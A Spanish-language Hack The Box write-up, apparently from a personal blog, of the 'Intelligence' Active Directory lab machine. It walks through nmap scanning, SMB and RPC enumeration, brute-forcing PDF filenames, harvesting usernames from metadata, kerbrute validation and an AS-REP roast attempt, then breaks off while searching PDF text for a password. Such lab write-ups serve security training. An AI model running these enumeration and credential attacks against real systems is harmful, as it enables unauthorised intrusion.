@@ -1,0 +1,1081 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Intelligence (medium) · MiguelRega7</title>
+<meta name="description" content="- Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored o"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Intelligence (medium)</h1><div class="meta"><span>◷</span><time>2024-08-12</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored o.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#smb">SMB</a><a href="#user-flag">User flag</a><a href="#shell-as-nt-authority-system-and-root-flag">Shell as nt authority system and root flag</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png">
+</p>
+
+<ul>
+<li>Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49669,49691,49692,49696,49713,50192 10.10.10.248 -oN targeted
+[sudo] password for miguelrega7: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 18:48 CST
+Nmap scan report for 10.10.10.248
+Host is up (0.11s latency).
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+80/tcp    open     http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Intelligence
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-06 07:48:52Z)
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+9389/tcp  open     mc-nmf        .NET Message Framing
+49669/tcp filtered unknown
+49691/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49692/tcp open     msrpc         Microsoft Windows RPC
+49696/tcp filtered unknown
+49713/tcp filtered unknown
+50192/tcp filtered unknown
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-08-06T07:49:43
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 6h59m58s
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.10.10.248
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+</code></pre></div></div>
+<ul>
+<li>Vamos agregar los nombres de dominio al <code>/etc/hosts</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ echo &quot;10.10.10.248 dc.intelligence.htb intelligence.htb&quot; | sudo tee -a /etc/hosts
+10.10.10.248 dc.intelligence.htb intelligence.htb
+</code></pre></div></div>
+<ul>
+<li>No podemos enumerar por <code>smb</code> con <code>crackmapexec</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.10.10.248 -u &quot;miguel&quot; -p &quot;&quot; --shares
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\miguel: STATUS_LOGON_FAILURE 
+</code></pre></div></div>
+<ul>
+<li>Si probamos otra herramienta vemos que no nos reporta ningún recurso compartido.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient -L 10.10.10.248 -N
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbmap -H 10.10.10.248 --no-banner
+[\] Checking for open ports...                                                                                                  [|] Checking for open ports...                                                                                                  [/] Checking for open ports...                                                                                                  [*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
+[*] Closed 1 connections        
+</code></pre></div></div>
+<ul>
+<li>Si intentamos enumerar por el protocolo RPC no nos deja.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rpcclient -N -U &quot;&quot; 10.10.10.248
+rpcclient $&gt; enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+<ul>
+<li>Esta es la pagina web.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/intelligence/1.png">
+</p>
+
+<ul>
+<li>Estas son las tecnologías que esta usando.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">❯ whatweb http://10.10.10.248
+http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]
+</code></pre></div></div>
+<ul>
+<li>En el apartado de las imágenes hay 2 botones los cuales nos dice Download son archivos .pdf este es su contenido.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/intelligence/2.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/intelligence/3.png">
+</p>
+
+<ul>
+<li>Vamos a descargarlos para ver los metadatos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wget http://10.10.10.248/documents/2020-01-01-upload.pdf
+--2024-08-05 19:20:52--  http://10.10.10.248/documents/2020-01-01-upload.pdf
+Connecting to 10.10.10.248:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 26835 (26K) [application/pdf]
+Saving to: ‘2020-01-01-upload.pdf’
+
+2020-01-01-upload.pdf           100%[=======================================================&gt;]  26.21K  --.-KB/s    in 0.1s    
+
+2024-08-05 19:20:53 (256 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]
+
+                                                                                                                                
+❯ wget http://10.10.10.248/documents/2020-12-15-upload.pdf
+--2024-08-05 19:21:00--  http://10.10.10.248/documents/2020-12-15-upload.pdf
+Connecting to 10.10.10.248:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 27242 (27K) [application/pdf]
+Saving to: ‘2020-12-15-upload.pdf’
+
+2020-12-15-upload.pdf           100%[=======================================================&gt;]  26.60K  --.-KB/s    in 0.1s    
+
+2024-08-05 19:21:00 (246 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]
+</code></pre></div></div>
+<ul>
+<li>Encontramos el nombre de los creadores.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ exiftool 2020-01-01-upload.pdf
+ExifTool Version Number         : 12.76
+File Name                       : 2020-01-01-upload.pdf
+Directory                       : .
+File Size                       : 27 kB
+File Modification Date/Time     : 2021:04:01 11:00:00-06:00
+File Access Date/Time           : 2024:08:05 19:20:53-06:00
+File Inode Change Date/Time     : 2024:08:05 19:20:53-06:00
+File Permissions                : -rw-rw-r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Page Count                      : 1
+Creator                         : William.Lee
+
+❯ exiftool 2020-12-15-upload.pdf
+ExifTool Version Number         : 12.76
+File Name                       : 2020-12-15-upload.pdf
+Directory                       : .
+File Size                       : 27 kB
+File Modification Date/Time     : 2021:04:01 11:00:00-06:00
+File Access Date/Time           : 2024:08:05 19:21:00-06:00
+File Inode Change Date/Time     : 2024:08:05 19:21:00-06:00
+File Permissions                : -rw-rw-r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Jose.Williams
+</code></pre></div></div>
+<ul>
+<li><p>Como tenemos los nombres de creadores lo mas probable es que sean usuarios del dominio pero podemos hacer Fuzzing para encontrar mas PDFs en caso de que los allá y descargarlos.</p>
+</li>
+<li><p>Vamos a descargar solo los que existan para extraer los nombres de los creadores.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ for i in {2020..2022}; do for j in {01..12}; do for k in {01..31}; do echo &quot;http://10.10.10.248/documents/$i-$j-$k-upload.pdf&quot;; done; done; done | xargs -n 1 -P 20 wget
+</code></pre></div></div>
+<ul>
+<li>Como son demasiados usuarios vamos a filtrar por sus nombres y meterlos a una lista.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ exiftool * .pdf | grep &quot;Creator&quot; | awk 'NF{print $NF}'
+William.Lee
+William.Lee
+Scott.Scott
+Jason.Wright
+Veronica.Patel
+Jennifer.Thomas
+Danny.Matthews
+David.Reed
+Stephanie.Young
+Daniel.Shelton
+Jose.Williams
+John.Coleman
+Jason.Wright
+Jose.Williams
+Daniel.Shelton
+Brian.Morris
+Jennifer.Thomas
+Thomas.Valenzuela
+Travis.Evans
+Samuel.Richardson
+Richard.Williams
+David.Mcbride
+Jose.Williams
+John.Coleman
+William.Lee
+Anita.Roberts
+Brian.Baker
+Jose.Williams
+David.Mcbride
+Kelly.Long
+John.Coleman
+Jose.Williams
+Nicole.Brock
+Thomas.Valenzuela
+David.Reed
+Kaitlyn.Zimmerman
+Jason.Patterson
+Thomas.Valenzuela
+David.Mcbride
+Darryl.Harris
+William.Lee
+Stephanie.Young
+David.Reed
+Nicole.Brock
+David.Mcbride
+William.Lee
+Stephanie.Young
+John.Coleman
+David.Wilson
+Scott.Scott
+Teresa.Williamson
+John.Coleman
+Veronica.Patel
+John.Coleman
+Samuel.Richardson
+Ian.Duncan
+Nicole.Brock
+William.Lee
+Jason.Wright
+Travis.Evans
+David.Mcbride
+Jessica.Moody
+Ian.Duncan
+Jason.Wright
+Richard.Williams
+Tiffany.Molina
+Jose.Williams
+Jessica.Moody
+Brian.Baker
+Anita.Roberts
+Teresa.Williamson
+Kaitlyn.Zimmerman
+Jose.Williams
+Stephanie.Young
+Samuel.Richardson
+Tiffany.Molina
+Ian.Duncan
+Kelly.Long
+Travis.Evans
+Ian.Duncan
+Jose.Williams
+Jose.Williams
+David.Wilson
+Thomas.Hall
+Ian.Duncan
+Error: File not found - .pdf
+Jason.Patterson
+Stephanie.Young
+Kaitlyn.Zimmerman
+Travis.Evans
+Kelly.Long
+Danny.Matthews
+Travis.Evans
+Jessica.Moody
+Thomas.Valenzuela
+Anita.Roberts
+Stephanie.Young
+David.Reed
+Jose.Williams
+Veronica.Patel
+Ian.Duncan
+Richard.Williams
+</code></pre></div></div>
+<ul>
+<li>Como hay repeticiones vamos aplicar un <code>sort</code> para eliminar las repeticiones.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ exiftool * .pdf | grep &quot;Creator&quot; | awk 'NF{print $NF}' | sort -u
+Error: File not found - .pdf
+Anita.Roberts
+Brian.Baker
+Brian.Morris
+Daniel.Shelton
+Danny.Matthews
+Darryl.Harris
+David.Mcbride
+David.Reed
+David.Wilson
+Ian.Duncan
+Jason.Patterson
+Jason.Wright
+Jennifer.Thomas
+Jessica.Moody
+John.Coleman
+Jose.Williams
+Kaitlyn.Zimmerman
+Kelly.Long
+Nicole.Brock
+Richard.Williams
+Samuel.Richardson
+Scott.Scott
+Stephanie.Young
+Teresa.Williamson
+Thomas.Hall
+Thomas.Valenzuela
+Tiffany.Molina
+Travis.Evans
+Veronica.Patel
+William.Lee
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ exiftool *.pdf | grep &quot;Creator&quot; | awk 'NF{print $NF}' | sort -u &gt; users.txt
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a comprobar que los usuarios sean validos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ /opt/kerbrute_linux_amd64 userenum --dc dc.intelligence.htb -d intelligence.htb users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/05/24 - Ronnie Flathers @ropnop
+
+2024/08/05 19:47:26 &gt;  Using KDC(s):
+2024/08/05 19:47:26 &gt;  	dc.intelligence.htb:88
+
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Anita.Roberts@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Ian.Duncan@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	David.Wilson@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	David.Reed@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Brian.Baker@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Darryl.Harris@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Daniel.Shelton@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Brian.Morris@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	David.Mcbride@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Danny.Matthews@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Jason.Wright@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Jason.Patterson@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Jose.Williams@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Kelly.Long@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Kaitlyn.Zimmerman@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Jennifer.Thomas@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	John.Coleman@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Jessica.Moody@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Richard.Williams@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Nicole.Brock@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Samuel.Richardson@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Stephanie.Young@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Teresa.Williamson@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Scott.Scott@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Thomas.Valenzuela@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Travis.Evans@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Veronica.Patel@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Thomas.Hall@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	Tiffany.Molina@intelligence.htb
+2024/08/05 19:47:26 &gt;  [+] VALID USERNAME:	William.Lee@intelligence.htb
+</code></pre></div></div>
+<ul>
+<li><p>Son existentes así que vamos a probar un <code>ASREPRoast</code> <a href="https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html">https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html</a>.</p>
+</li>
+<li><p>Ningún usuario es vulnerable.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-GetNPUsers intelligence.htb/ -no-pass -usersfile users.txt
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre></div></div>
+<ul>
+<li>En los PDFs sabemos que tienen contenido así que vamos a utilizar la siguiente herramienta para ver si en los textos hay alguna contraseña <a href="https://github.com/jalan/pdftotext">https://github.com/jalan/pdftotext</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ for file in $(ls); do echo $file; done | grep -v users.txt | while read filename; do pdftotext $filename; done
+</code></pre></div></div>
+<ul>
+<li>Si examinamos los <code>.txt</code> vemos una contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
